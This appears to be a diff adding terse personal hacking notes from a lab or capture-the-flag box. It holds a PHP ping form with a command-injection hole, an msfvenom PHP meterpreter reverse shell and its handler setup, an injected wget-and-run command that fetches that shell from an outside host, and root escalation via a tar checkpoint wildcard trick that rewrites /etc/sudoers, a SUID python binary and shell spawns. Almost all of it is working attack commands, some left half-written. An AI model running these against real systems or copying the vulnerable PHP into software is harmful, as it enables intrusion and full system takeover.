@@ -1,0 +1,55 @@
+used aboutus page
+
+<html>
+<head>
+<title>ping host</title>
+</head>
+<body>
+<form method="GET" action="">
+  <input type="text" name="host" />
+  <input type="submit" value="ping host" />
+</form>
+<?php
+if(isset($_GET['host'])) {
+  $output = shell_exec("ping -c1 ".$_GET['host']);
+  echo "<pre>$output</pre>";
+}
+?>
+</body>
+</html>
+https://www.aldeid.com/wiki/Command-injection-to-shell
+shell
+
+msfvenom -p php/meterpreter/reverse_tcp -f raw lhost=192.168.1.43 lport=4050 > /var/www/shell.txt
+
+edit shell, take # out,,, first line, 
+
+start python -m 
+
+get msfconsole ready
+msfconsole
+msf > use multi/handler
+msf  exploit(handler) > set payload php/meterpreter/reverse_tcp
+msf  exploit(handler) > set lhost 192.168.1.43
+msf  exploit(handler) > set lport 4050
+msf  exploit(handler) > exploit
+
+
+upload and execute ,,, lovely
+;wget http://10.9.4.45:80/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php
+
+
+trying to escalate with GTFO
+
+echo 'echo "serv1 ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
+echo "/var/www/html"  > --checkpoint=1
+
+
+sudo install -m =xs $(python3) .
+
+
+
+python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+sudo python3 -c 'import os; os.system("/bin/sh")'
